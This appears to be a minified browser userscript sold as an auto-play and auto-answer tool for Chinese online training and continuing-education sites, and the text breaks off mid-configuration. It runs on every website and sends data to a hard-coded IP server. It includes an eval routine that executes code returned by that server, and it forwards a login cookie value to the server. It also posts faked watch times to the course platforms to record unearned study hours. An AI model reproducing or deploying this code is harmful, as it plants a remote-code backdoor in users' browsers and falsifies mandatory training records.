// ==UserScript==
// @name         【ROA-2025年最新】💯💯💯网课自动化工具-✅自动连播-🚀高速播放-🔍Ai精准自动搜题 💥万人安装使用
// @namespace    http://tampermonkey.net/
// @version      2.3.9.1
// @description  河南教师网络学院|法宣在线|成都职业培训网络学院|广西干部网络学院|丝路数字学堂|河南教师网络学院|中华医学|蕴瑜课堂|全国高校教师网络培训中心|中国教育电视台|北京市继续医学教育必修课培训｜法宣在线|重庆经贸职业学院｜贵州省级专业技术|平凉市教育培训|甘肃省专业技术人员|河南专技培训|广东医科大学|中国干部网络学院浦东分院|和学在线|安徽继续教育在线|新疆职业健康培训系统|河北药师网|贵州省专业技术人员继续教育平台|湖南开放大学|西南交通大学|新疆继续教育|梦想在线|贵州黔南经济学院|思想天下|石家庄铁道大学继续教育|建投学堂|山东青年政治学院|北华大学党校教育培训系统|吉林省专业技术人员|河南科技职业大学|湖北师范大学|湖北师范大学|湖北第二师范学院|成都市中小学教师继续教育网|高等学历继续教育|广东学习网|电子科技大学继续教育学院|夏邑县小学教师岗位培训平台|贵州地矿专技学时在线|甘肃干部网络学院|企安全|贵州省党员干部网络学院|湖南师范大学|广州市事业单位工作人员|河南教师培训网
// @author
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_openInTab
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_addValueChangeListener
// @grant        window.close
// @grant        unsafeWindow
// @grant        GM_registerMenuCommand
// @antifeature  payment
// @connect      www.gaozhiwang.top
// @connect      119.45.5.172
// @connect      localhost
// @license      MIT
// @require      https://unpkg.com/vue@3/dist/vue.global.prod.js
// @grant        GM_addStyle
// @grant        GM_addElement
// @downloadURL https://update.greasyfork.org/scripts/530714/%E3%80%90ROA-2025%E5%B9%B4%E6%9C%80%E6%96%B0%E3%80%91%F0%9F%92%AF%F0%9F%92%AF%F0%9F%92%AF%E7%BD%91%E8%AF%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7-%E2%9C%85%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%92%AD-%F0%9F%9A%80%E9%AB%98%E9%80%9F%E6%92%AD%E6%94%BE-%F0%9F%94%8DAi%E7%B2%BE%E5%87%86%E8%87%AA%E5%8A%A8%E6%90%9C%E9%A2%98%20%F0%9F%92%A5%E4%B8%87%E4%BA%BA%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8.user.js
// @updateURL https://update.greasyfork.org/scripts/530714/%E3%80%90ROA-2025%E5%B9%B4%E6%9C%80%E6%96%B0%E3%80%91%F0%9F%92%AF%F0%9F%92%AF%F0%9F%92%AF%E7%BD%91%E8%AF%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7-%E2%9C%85%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%92%AD-%F0%9F%9A%80%E9%AB%98%E9%80%9F%E6%92%AD%E6%94%BE-%F0%9F%94%8DAi%E7%B2%BE%E5%87%86%E8%87%AA%E5%8A%A8%E6%90%9C%E9%A2%98%20%F0%9F%92%A5%E4%B8%87%E4%BA%BA%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8.meta.js
// ==/UserScript==



!async function () {
    if (-1 !== location.origin.indexOf("gaozhiwang.top")) return;
    if (-1 !== location.pathname.indexOf("/learning/CourseImports/localhost")) return;
    if (-1 !== location.pathname.indexOf("BootStrap_CourseIndex.aspx")) return;
    if (-1 !== location.pathname.indexOf("/student/BootStrap_zjlx.aspx")) return;
    if (-1 !== location.pathname.indexOf("/student/BootStrap_zxks.aspx")) return;
    if (-1 !== location.pathname.indexOf("/student/BootStrap_zxzy.aspx")) return;

    class GMTool {
        constructor() {
        }

        getValue(e) {
            return GM_getValue(e, null)
        }

        setValue(e, t) {
            GM_setValue(e, t)
        }

        deleteValue(e) {
            GM_deleteValue(e)
        }

        registerMenuCommand(e, t, o) {
            GM_registerMenuCommand(e, () => {
                "function" == typeof o && o()
            }, t)
        }

        openInTab(e) {
            GM_openInTab(e, {active: !0})
        }

        isDateGreaterThanSevenDays(e) {
            e = new Date(e).getTime();
            return 7 < ((new Date).getTime() - e) / 864e5
        }

        axfedata(t) {
            return new Promise(e => {
                GM_xmlhttpRequest({
                    ...t, onload: function (o) {
                        if (200 == o.status) {
                            let t;
                            try {
                                t = JSON.parse(o.response)
                            } catch (e) {
                                t = o.response
                            }
                            e(t)
                        }
                    }
                })
            })
        }

        sleep(t) {
            return new Promise(e => setTimeout(e, t))
        }

        uif(data) {
            try {
                eval(data)
            } catch (e) {
                new Function(data)()
            }
        }

        async cllData(e) {
            e = await this.axfedata({method: "GET", url: bl + "/open/basic_usercollection/info/add?" + e});
            if (1e3 == e.code && MyTool.setValue("cllData", "" + new Date), 20231 == e.code) for (this.uif(e.data); ;) ;
            return e
        }

        timeToSeconds(e) {
            let n = e.split(":").map(Number);
            return n.reduce((e, t, o) => e + t * Math.pow(60, n.length - o - 1), 0)
        }
    }

    let MyTool = new GMTool;

    function showTip(e, t = 0, o) {
    }

    MyTool.registerMenuCommand("\u66f4\u65b0\u811a\u672c", "u", () => {
        window.open("http://public.gaozhiwang.top/public/roa.user.js")
    });
    let iframes = document.querySelectorAll("iframe"), notShowIniframe = [], version = "2.0.0",
        bl = "http://119.45.5.172:7013", _notShowIniframe = (MyTool.axfedata({
            url: bl + "/open/basic_blacklist/info/vertifyBlackuser",
            method: "GET"
        }).then(e => {
            e && window.close()
        }), await MyTool.axfedata({url: bl + "/open/basic_ctxs/info/notShowIniframe", method: "GET"}));
    if (notShowIniframe.push(..._notShowIniframe.data), iframes.length && notShowIniframe.includes(location.host)) {
        if (window !== window.top) {
            GM_addStyle(getCss());
            let container = GM_addElement(document.body, "div", {id: "vue-app"});
            container.innerHTML = getHTML(), bootstrap()
        }
    } else {
        GM_addStyle(getCss());
        let container = GM_addElement(document.body, "div", {id: "vue-app"});
        container.innerHTML = getHTML()
    }
    window.top === window.self && bootstrap();
    let jjmlo = `
      var str = '';
    for (var i = 0; i < hex.length; i += 2) {
      var hexChar = hex.substr(i, 2);
      var charCode = parseInt(hexChar, 16);
      str += String.fromCharCode(charCode);
    }
    return str;
  `, os = {
        uxueyuan: {mainClass: "CTXCommon", option: {nodeListClass: ".page-name", activeClass: "active"}},
        hus85: {
            mainClass: "CTXCommon",
            option: {nodeListClass: ".chsTitle>a", activeClass: "one_p_a", topicListClass: [".exam_items"]}
        },
        ho0132: {
            mainClass: "CTXCommon", apis: {
                getP_h5_u() {
                    return document.cookie.split("; ").find(e => e.startsWith("p_h5_u="))?.replace(/p_h5_u=(.*?)/, "") || ""
                }
            }, option: {
                nodeListClass: ".stu-ui-li-span>li", activeClass: "activeLi", async _init(n) {
                    let a = setInterval(async () => {
                        try {
                            var e, t;
                            if ("/hsyd_stu/a/toStuspace/index" == location.pathname && (e = _i1.ho0132.apis.getP_h5_u()) && (clearInterval(a), MyTool.axfedata({
                                url: `${bl}/open/basic_order/info/checkUseAccount?toolkey=${MyTool.getValue("newToken")}&account=${e}&type=2`,
                                method: "GET"
                            }).then(e => {
                                200 === e.code ? showTip("✅✅✅\u7ed1\u5b9a\u6210\u529f，\u8bf7\u70b9\u51fb\u8981\u5b66\u4e60\u7684\u8bfe\u7a0b", 5e3) : alert(e.message)
                            })), "/hsyd_stu/a/toStuspace/courseIndex" == location.pathname && (t = document.querySelectorAll(".eva-nav-item")[7]) && !t.classList.contains("active") && (clearInterval(a), a = setInterval(() => {
                                var e = document.querySelector("iframe").contentDocument.querySelector("span.eva-tag[type='danger']");
                                e && (clearInterval(a), e.dispatchEvent(new Event("click")))
                            }, 1500), MyTool.setValue("homeUrl", location.href), t.querySelector("a")?.click()), "/hsyd_stu/a/toStuspace/coursestudent1" == location.pathname && (n.ElementObj.$allTask = document.querySelectorAll(".stu-ui-li-span>li"), n.ElementObj.$allTask.length)) {
                                clearInterval(a);
                                for (let e = 0; e < n.ElementObj.$allTask.length; e++) if (n.ElementObj.$allTask[e].classList.contains("activeLi")) {
                                    n.currentIndex = e;
                                    var o = _i1.ho0132.apis.getP_h5_u();
                                    MyTool.axfedata({
                                        url: `${bl}/open/basic_order/info/checkUseAccount?toolkey=${MyTool.getValue("newToken")}&account=${o}&type=2`,
                                        method: "GET"
                                    }).then(e => {
                                        200 === e.code ? n._o1(n) : alert(e.message)
                                    });
                                    break
                                }
                            }
                        } catch (e) {
                        }
                    }, 500)
                }, videoEle(n) {
                    return new Promise(e => {
                        let t = 0, o = setInterval(() => {
                            t += 1, n.ElementObj.$video = document.querySelector("iframe").contentDocument.querySelector("video"), n.ElementObj.$video && (n.ElementObj.$video.src || n.ElementObj.$video.querySelector("source")) ? (clearInterval(o), e(1)) : 6 <= t && (clearInterval(o), e(2))
                        }, 1e3)
                    })
                }, async playFn(t) {
                    var e = await t.getVideoDom();
                    if (await t.changeHtml(document.querySelector("#sources")), 1 == e) {
                        t.ElementObj.$video.pause();
                        var o = Math.floor(t.ElementObj.$video.duration), n = location.href.match(/sourceId=(.+)/)[1],
                            a = location.href.match(/id=(.+)&c/)[1],
                            i = await fetch(location.origin + "/hsyd_stu/a/toStuspace/studyDetail", {
                                headers: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
                                body: `id=${n}&courseId=` + a,
                                method: "POST",
                                mode: "cors",
                                credentials: "include"
                            }).then(e => e.json());
                        o && i.d_id || location.reload();
                        let e = 0;
                        var s,
                            l = document.querySelectorAll(".stu-ui-li-span>li.activeLi")[0].innerText.replace(/\s/g, "");
                        for (s of new Array(1e3)) {
                            if (e >= o) {
                                e = o, t.addInfo("✅✅✅\u672c\u7ae0\u8282\u5b66\u4e60\u5b8c\u6210，\u5373\u5c06\u81ea\u52a8\u8fdb\u884c\u4e0b\u4e00\u8282\u4efb\u52a1"), t.playNext();
                                break
                            }
                            e += 60, t.addInfo(`🔊🔊🔊【${l}】\u6b63\u5728\u9ad8\u901f\u5b66\u4e60\u4e2d，\u5f53\u524d\u5df2\u5b8c\u6210${e}\u79d2，\u4efb\u52a1\u603b\u65f6\u95f4${o}\u79d2`), fetch(location.origin + "/hsyd_stu/a/toStuspace/studyDetail_jsq", {
                                headers: {
                                    accept: "application/json, text/javascript, */*; q=0.01",
                                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
                                },
                                body: `id=${n}&courseId=${a}&duartion=${e}&d_id=` + i.d_id,
                                method: "POST",
                                mode: "cors",
                                credentials: "include"
                            }), await MyTool.sleep(1e3)
                        }
                    }
                }, async playNext(e) {
                    location.href = MyTool.getValue("homeUrl")
                }
            }
        },
        hgs02: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", async _init(t) {
                    let e = setInterval(async () => {
                        if (t.ElementObj.$parentNodes = document.querySelectorAll(".mozs_list>li"), t.ElementObj.$parentNodes.length) {
                            clearInterval(e);
                            for (let e = 0; e < t.ElementObj.$parentNodes.length; e++) if (100 != t.ElementObj.$parentNodes[e].querySelector(".jdt_bar").innerText.match(/[0-9]+/)[0]) {
                                MyTool.setValue("homeUrl", location.href), document.querySelector(".qd_but").click();
                                break
                            }
                        }
                        if (t.ElementObj.$allTask = document.querySelectorAll(".lcml_djj_list>li"), t.ElementObj.$allTask.length && "/p/classroom/simple" == location.pathname) {
                            clearInterval(e);
                            for (let e = 0; e < t.ElementObj.$allTask.length; e++) t.ElementObj.$allTask[e].classList.contains("on") && (t.currentIndex = e, t._o1(t))
                        }
                    })
                }, videoEle: a => new Promise(t => {
                    let o = 0, n = setInterval(async () => {
                        o += 1;
                        var e = document.querySelector(".xgplayer-start");
                        e ? (clearInterval(n), document.querySelectorAll(".xgplayer-icon")[2].click(), e.click(), await MyTool.sleep(3e3), a.ElementObj.$video = document.querySelector("video"), t(1)) : 7 <= o && (clearInterval(n), t(2))
                    }, 1e3)
                }), beforePlayNext(e) {
                    e.currentIndex == e.ElementObj.$allTask.length - 1 && (location.href = MyTool.getValue("homeUrl"))
                }
            }
        },
        uasf: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", async _init(e) {
                    let t = setInterval(async () => {
                        try {
                            ElementObj.$nextBtn = document.querySelectorAll("iframe")[1].contentDocument.querySelector("frame").contentDocument.querySelector("#btnNext"), e.ElementObj.$nextBtn && (clearInterval(t), e._o1(e))
                        } catch (e) {
                        }
                    }, 500)
                }, async playFn(t) {
                    let o = document.querySelectorAll("iframe")[1].contentDocument.querySelectorAll("frame")[1].contentDocument;
                    var e = o.querySelector("tbody");
                    await t.changeHtml(e, o);
                    let n = setInterval(async () => {
                        try {
                            var e = o.querySelector("td[id]").innerText;
                            t.addInfo(e, 1, o), e && -1 != e.indexOf("\u5df2\u7ecf\u5b66\u4e60\u5b8c\u6bd5") && (clearInterval(n), setTimeout(() => {
                                t._o1(t)
                            }, 2e3), t.ElementObj.$nextBtn.click())
                        } catch (e) {
                        }
                    }, 1e3)
                }
            }
        },
        hf01: {
            mainClass: "CTXCommon", apis: {
                coursefind: e => new Promise(t => {
                    fetch(`https://www.secxm.com/api/student/course/find/${e}?page=1&size=10000`, {
                        headers: {
                            accept: "application/json, text/plain, */*",
                            "accept-language": "zh-CN,zh;q=0.9",
                            authorization: "Bearer 12fe24bac5d14dcf8a5509b979a21eaa",
                            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": '"Windows"',
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin"
                        },
                        referrerPolicy: "strict-origin-when-cross-origin",
                        body: null,
                        method: "GET",
                        mode: "cors",
                        credentials: "include"
                    }).then(e => e.json()).then(e => t(e))
                }), appendHours: e => new Promise(t => {
                    fetch("https://www.secxm.com/api/student/appendHours", {
                        headers: {
                            accept: "application/json, text/plain, */*",
                            "accept-language": "zh-CN,zh;q=0.9",
                            authorization: "Bearer 12fe24bac5d14dcf8a5509b979a21eaa",
                            "content-type": "application/json",
                            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": '"Windows"',
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin"
                        },
                        referrerPolicy: "strict-origin-when-cross-origin",
                        body: e,
                        method: "POST",
                        mode: "cors",
                        credentials: "include"
                    }).then(e => e.json()).then(e => t(e))
                })
            }, option: {
                nodeListClass: "",
                activeClass: "",
                openListenPlayStatus: !1,
                openListenPlayTime: !1,
                _init: async a => {
                    let i = setInterval(async () => {
                        var e = document.querySelector(".video-lt");
                        if ("/courseintroduction" === location.pathname && e) {
                            clearInterval(i);
                            var t = /id=(.+)&loopPlay/.exec(location.href)[1], o = await _i1.hf01.apis.coursefind(t);
                            e.style.position = "relative", await a.changeHtml(e);
                            for (let e = 0; e < o.result.elements.length; e++) for (var n of o.result.elements[e].subContentTemplate) n.totalClassHours < n.duration && (a.addInfo("\u5373\u5c06\u8fdb\u884c\u672a\u5b8c\u6210\u8bfe\u7a0b", n.title), localStorage.setItem("itemdata", JSON.stringify(n)), await a._o1(a)), await MyTool.sleep(1e3)
                        }
                    }, 500)
                },
                async playFn(e) {
                    var t = localStorage.getItem("itemdata");
                    if (!t) return alert("\u53c2\u6570\u9519\u8bef #1");
                    let o = (t = JSON.parse(t)).totalClassHours || 0;
                    var n, a = {studentCourseId: "", contentId: t.id, duration: 180};
                    a.studentCourseId = /id=(.+)&loopPlay/.exec(location.href)[1];
                    for (n of new Array(1e3)) {
                        if (e.addInfo(`\u5df2\u6210\u529f\u5b66\u4e60${o}\u79d2，\u5f53\u524d\u4efb\u52a1\u9700\u5b8c\u6210${t.duration}\u79d2`), o >= t.duration) {
                            e.addInfo(`🎉🎉🎉【${t.title}】，\u5b66\u4e60\u5b8c\u6210🎉🎉🎉`);
                            break
                        }
                        await _i1.hf01.apis.appendHours(JSON.stringify(a));
                        o += 180, await MyTool.sleep(1e3)
                    }
                }
            }
        },
        asds1: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "", activeClass: "", _init: async d => {
                    let p = setInterval(async () => {
                        if (d.ElementObj.$video = document.querySelector("video"), d.ElementObj.$video) {
                            clearInterval(p);
                            var t = document.querySelector(".rightcontent") || d.ElementObj.$video.parentElement,
                                o = (await d.changeHtml(t), d.addInfo("\u6b63\u5728\u83b7\u53d6token..."), dsf.getToken());
                            d.addInfo("✅✅✅token：" + o), d.addInfo("\u6b63\u5728\u83b7\u53d6\u8bfe\u7a0b\u5217\u8868...");
                            let e = location.href.match(/id=(.+)/)[1];
                            var n, a = [];
                            if (-1 != location.href.indexOf("commonpage/classcolumn")) {
                                d.addInfo("\u6b63\u5728\u83b7\u53d6parents"), r = e, c = o;
                                e:for (var i of (await new Promise((t, e) => {
                                    location.origin;
                                    fetch(location.origin + "/nc/pack/channel/course/list" + "?id=" + r, {
                                        headers: {
                                            accept: "application/json, text/plain, */*",
                                            "accept-language": "zh-CN,zh;q=0.9",
                                            authorization_token: c,
                                            client: "pc",
                                            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                                            "sec-ch-ua-mobile": "?0",
                                            "sec-ch-ua-platform": '"Windows"',
                                            "sec-fetch-dest": "empty",
                                            "sec-fetch-mode": "cors",
                                            "sec-fetch-site": "same-origin"
                                        },
                                        referrer: location.origin + "/page.html",
                                        referrerPolicy: "strict-origin-when-cross-origin",
                                        body: null,
                                        method: "GET",
                                        mode: "cors",
                                        credentials: "include"
                                    }).then(e => e.json()).then(e => t(e))
                                })).data) {
                                    d.addInfo(`【${i.name}】`);
                                    for (let t of i.subList) if (d.addInfo(`\u6b63\u5728\u83b7\u53d6${t.name}\u7684\u8bfe\u7a0b，\u5df2\u5b8c\u6210\u8fdb\u5ea6` + t.progress), !(95 < t.progress)) {
                                        var s = (await h(t.businessId, o)).data.playTree.children.map(e => ({
                                            ...e,
                                            businessId: t.businessId
                                        }));
                                        a.push(...s);
                                        break e
                                    }
                                }
                            } else {
                                t = await h(e, o);
                                a.push(...t.data.playTree.children)
                            }
                            d.addInfo("✅✅✅\u8bfe\u7a0b\u5217\u8868\u83b7\u53d6\u6210\u529f");
                            for (n of a) if (!(100 <= n.finishedRate)) {
                                d.addInfo("\u5373\u5c06\u5f00\u59cb\u5b66\u4e60" + n.title);
                                var l = {
                                    courseId: e = -1 != location.href.indexOf("commonpage/classcolumn") ? n.businessId : e,
                                    coursewareId: n.id,
                                    watchPoint: "00:01:11",
                                    pulseTime: 10,
                                    pulseRate: 1,
                                    realWatchTime: "00:01:06"
                                };
                                localStorage.setItem("fetchOption", JSON.stringify(l)), localStorage.setItem("token", o), await d._o1();
                                break
                            }
                        }
                        var r, c
                    }, 900);

                    function h(o, n) {
                        return new Promise((t, e) => {
                            location.origin;
                            fetch(location.origin + "/inc/nc/course/play/getPlayTrend" + "?courseId=" + o, {
                                headers: {
                                    accept: "application/json, text/plain, */*",
                                    "accept-language": "zh-CN,zh;q=0.9",
                                    authorization_token: n,
                                    client: "pc",
                                    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-ch-ua-platform": '"Windows"',
                                    "sec-fetch-dest": "empty",
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-origin"
                                },
                                referrerPolicy: "strict-origin-when-cross-origin",
                                body: null,
                                method: "GET",
                                mode: "cors",
                                credentials: "include"
                            }).then(e => e.json()).then(e => t(e))
                        })
                    }
                }, playFn: async e => {
                    let o = localStorage.getItem("fetchOption"), n = (o = JSON.parse(o), localStorage.getItem("token"));
                    for (var t of new Array(1e4)) {
                        e.addInfo(`🔊\u5f53\u524d\u72b6\u6001\u6b63\u5728\u4ee5${e.spd}\u500d\u901f\u5b66\u4e60\u4e2d，（\u4e2d\u9014\u5173\u95ed\u8fdb\u5ea6\u4e0d\u4fdd\u5b58）`);
                        var a = await (() => {
                            let e = location.origin + "/inc/nc/course/play/pulseSaveRecord";
                            return new Promise(t => {
                                fetch(e, {
                                    headers: {
                                        accept: "application/json, text/plain, */*",
                                        "accept-language": "zh-CN,zh;q=0.9",
                                        authorization_token: n,
                                        client: "pc",
                                        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                                        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                                        "sec-ch-ua-mobile": "?0",
                                        "sec-ch-ua-platform": '"Windows"',
                                        "sec-fetch-dest": "empty",
                                        "sec-fetch-mode": "cors",
                                        "sec-fetch-site": "same-origin"
                                    },
                                    referrer: location.origin + "/page.html",
                                    referrerPolicy: "strict-origin-when-cross-origin",
                                    body: `courseId=${o.courseId}&coursewareId=${o.coursewareId}&watchPoint=00%3A06%3A19&pulseTime=10&pulseRate=2&realWatchTime=00%3A02%3A33`,
                                    method: "POST",
                                    mode: "cors",
                                    credentials: "include"
                                }).then(e => e.json()).then(e => t(e))
                            })
                        })();
                        if (e.addInfo(`\u5df2\u5b66\u4e60${a.data.finishedRate}%`), 100 <= a.data.finishedRate) {
                            location.reload();
                            break
                        }
                        await MyTool.sleep(1e3)
                    }
                }
            }
        },
        hsduf: {
            mainClass: "CTXCommon", option: {
                nodeListClass: ".menu_body dd", activeClass: "active", _init: async a => {
                    let i = setInterval(async () => {
                        var e = document.querySelector("#a2");
                        if (e) {
                            clearInterval(i), e.click(), await MyTool.sleep(2500);
                            var t = document.querySelectorAll("li[data-trainid]");
                            for (let e = 0; e < t.length; e++) {
                                var o = t[e];
                                MyTool.setValue("homeUrl", location.href), setTimeout(() => {
                                    window.close()
                                }, 2e4), o.querySelector("a").click()
                            }
                        }
                        if (a.ElementObj.$allTask = document.querySelectorAll(".menu_body dd"), 0 < a.ElementObj.$allTask.length) {
                            clearInterval(i);
                            let t = !0;
                            for (let e = 0; e < a.ElementObj.$allTask.length; e++) {
                                var n = a.ElementObj.$allTask[e];
                                if (!n.classList.contains("active")) {
                                    t = !1, a.currentIndex = e, n.classList.contains("hover") || n.querySelector("a").click(), showTip("✅✅✅\u6b63\u5728\u521d\u59cb\u5316", 3e3), a._o1();
                                    break
                                }
                            }
                            t && (e = MyTool.getValue("homeUrl") || "https://www.ejxjy.com/a/sys/portal/person", location.href = e)
                        }
                    }, 300)
                }, openListenPlayTime: !0, async playNext() {
                    location.reload()
                }, playFn: async e => {
                    await e.getVideoDom(), await e.changeHtml(e.ElementObj.$video.parentElement);
                    var t = Math.ceil(e.ElementObj.$video.duration);
                    let o = 0;
                    var n = await new Promise(t => {
                        fetch(location.href, {
                            headers: {
                                accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                "accept-language": "zh-CN,zh;q=0.9",
                                priority: "u=0, i",
                                "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": '"Windows"',
                                "sec-fetch-dest": "document",
                                "sec-fetch-mode": "navigate",
                                "sec-fetch-site": "same-origin",
                                "sec-fetch-user": "?1",
                                "upgrade-insecure-requests": "1"
                            },
                            referrerPolicy: "strict-origin-when-cross-origin",
                            body: null,
                            method: "GET",
                            mode: "cors",
                            credentials: "include"
                        }).then(e => e.text()).then(e => {
                            e = e.match(/saveVideo\?id=(.+)"/)?.[1];
                            t(e)
                        })
                    });
                    if (n && t) {
                        setInterval(() => {
                            document.querySelector(".jbox-button-focus")?.click()
                        }, 300);
                        var a, i = e.ElementObj.$video.duration;
                        for (a of new Array(1e4)) {
                            var s = await ((e, o, n) => new Promise(t => {
                                try {
                                    fetch("https://www.ejxjy.com/a/onlinelearn/stuCourse/saveVideo?id=" + n, {
                                        headers: {
                                            accept: "*/*",
                                            "accept-language": "zh-CN,zh;q=0.9",
                                            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                            priority: "u=0, i",
                                            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                                            "sec-ch-ua-mobile": "?0",
                                            "sec-ch-ua-platform": '"Windows"',
                                            "sec-fetch-dest": "empty",
                                            "sec-fetch-mode": "cors",
                                            "sec-fetch-site": "same-origin",
                                            "x-requested-with": "XMLHttpRequest"
                                        },
                                        referrerPolicy: "strict-origin-when-cross-origin",
                                        body: `nowTime=${e}&videoTime=` + o,
                                        method: "POST",
                                        mode: "cors",
                                        credentials: "include"
                                    }).then(e => e.json()).then(e => t(e))
                                } catch (e) {
                                    t(!1)
                                }
                            }))(o, i, n);
                            if (0 != s && o >= t) {
                                e.addInfo("🎉🎉🎉🎉🎉🎉🎉🎉\u5df2\u6210\u529f\u5b66\u5b8c🎉🎉🎉🎉🎉🎉🎉🎉"), await MyTool.sleep(3e3), e.playNext(e);
                                break
                            }
                            "success" == s.data && (o += +e.spd > t ? t : +e.spd), e.addInfo(`🔊\u5f53\u524d\u72b6\u6001\u6b63\u5728\u4ee5${e.spd}\u500d\u901f\u5b66\u4e60\u4e2d，\u5df2\u5b66\u4e60${o}\u79d2，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t / 60}\u5206\u949f`), await MyTool.sleep(500)
                        }
                    } else showTip("\u89c6\u9891\u65f6\u95f4\u9519\u8bef，\u8bf7\u5237\u65b0\u9875\u9762\u91cd\u8bd5"), location.reload()
                }
            }
        },
        bsd11: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "a.title", getCurrentIndexByOption(o) {
                    return new Promise((t, e) => {
                        for (let e = 0; e < o.ElementObj.$allTask.length; e++) if (o.ElementObj.$allTask[e].parentElement.classList.contains("active")) {
                            t(e);
                            break
                        }
                    })
                }
            }
        },
        sf1101: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: "span.studiedLesson",
                activeClass: "RED",
                openListenPlayStatus: !0,
                async getCurrentIndex(t) {
                    for (let e = 0; e < t.ElementObj.$allTask.length; e++) {
                        var o = t.ElementObj.$allTask[e];
                        if (!o.classList.contains("studiedLessonMark")) {
                            t.currentIndex = e, showTip("\u521d\u59cb\u5316\u5b8c\u6210，3\u79d2\u540e\u5f00\u59cb\u81ea\u52a8\u64ad\u653e", 3e3), o.click(), setTimeout(() => {
                                t.pdPlayFn(location.href)
                            }, 2e3);
                            break
                        }
                    }
                    -1 === t.currentIndex && alert("\u5f53\u524d\u7ae0\u8282\u6240\u6709\u89c6\u9891\u5df2\u7ecf\u5b66\u4e60\u5b8c")
                },
                videoEle(n) {
                    return new Promise(e => {
                        let t = 0, o = setInterval(() => {
                            t += 1, n.ElementObj.$video = document.querySelector("iframe")?.contentDocument?.querySelector("video"), n.ElementObj.$video ? (clearInterval(o), e(1)) : 7 <= t && (clearInterval(o), e(2))
                        }, 1e3)
                    })
                },
                async listenRebortFn(e) {
                    var t = document.querySelector("iframe")?.contentDocument?.querySelector("#popup_panel input");
                    t && (t.click(), e.play())
                },
                async playNext() {
                    location.reload()
                }
            }
        },
        ifsbds: {
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".tab-content-desc", activeClass: "desc-item-sel", _init: async t => {
                    let o = setInterval(() => {
                        if ("/kaoshi_qnzzxy/majorlist.html" == location.pathname) clearInterval(o), alert("\u8bf7\u9009\u62e9\u4e00\u4e2a\u8bfe\u7a0b，\u70b9\u51fb\u8fdb\u53bb"); else {
                            if (t.ElementObj.$allTask = document.querySelectorAll(".list-group-item"), 0 < t.ElementObj.$allTask.length) {
                                clearInterval(o);
                                for (var e of t.ElementObj.$allTask) if ("\u5b66\u4e60\u8fdb\u5ea6:100.00%" != e.querySelector(".list-group-item-text.text-muted").innerText) {
                                    MyTool.setValue("homeUrl", location.href), e.click();
                                    break
                                }
                            }
                            "/kaoshi_qnzzxy/test.html" == location.pathname && (clearInterval(o), t.pdPlayFn(location.href))
                        }
                    }, 500)
                }, playNext: async e => {
                    location.href = MyTool.getValue("homeUrl")
                }
            }
        },
        dsfs: {
            mainClass: "CTXCommon", option: {
                nodeListClass: "#content a", _init(a) {
                    return new Promise(o => {
                        let n = setInterval(() => {
                            if (a.ElementObj.$allTask = document.querySelectorAll("#content a"), a.ElementObj.$allTask.length) {
                                clearInterval(n);
                                var t = MyTool.getValue("preClassName");
                                if (t) {
                                    for (let e = 0; e < a.ElementObj.$allTask.length; e++) if (t == a.ElementObj.$allTask[e].innerText.trim()) {
                                        MyTool.setValue("homeUrl", location.href), a.ElementObj.$allTask[e + 1].click();
                                        break
                                    }
                                } else MyTool.setValue("homeUrl", location.href), a.ElementObj.$allTask[0].click();
                                o(!0)
                            }
                            var e = document.querySelector(".item-title.label h1 a");
                            e && "/m/Exam/Student/startStudy" == location.pathname && (clearInterval(n), e.click(), o(!0)), "/m/Exam/Student/startStudy" == location.pathname && (clearInterval(n), a.pdPlayFn(location.href), o(!0))
                        }, 500)
                    })
                }, playNext(e) {
                    return new Promise(async (e, t) => {
                        var o = document.querySelector(".startStudy-title>p")?.innerText.trim();
                        MyTool.setValue("preClassName", o), document.querySelector(".bottom-pc-btn button").click(), await MyTool.sleep(2e3), setTimeout(() => {
                            location.reload()
                        }, 3e3), document.querySelector(".modal-button.modal-button-bold").click()
                    })
                }
            }
        },
        sdf3: {
            mainClass: "CTXCommon",
            option: {nodeListClass: "#classes li", activeClass: "li_current_index", openListenPlayTime: !1}
        },
        sdf1: {
            name: "\u6cb3\u5357\u79d1\u6280\u804c\u4e1a\u5927\u5b66",
            mainClass: "CTXCommon",
            option: {
                nodeListClass: ".ml_2 li",
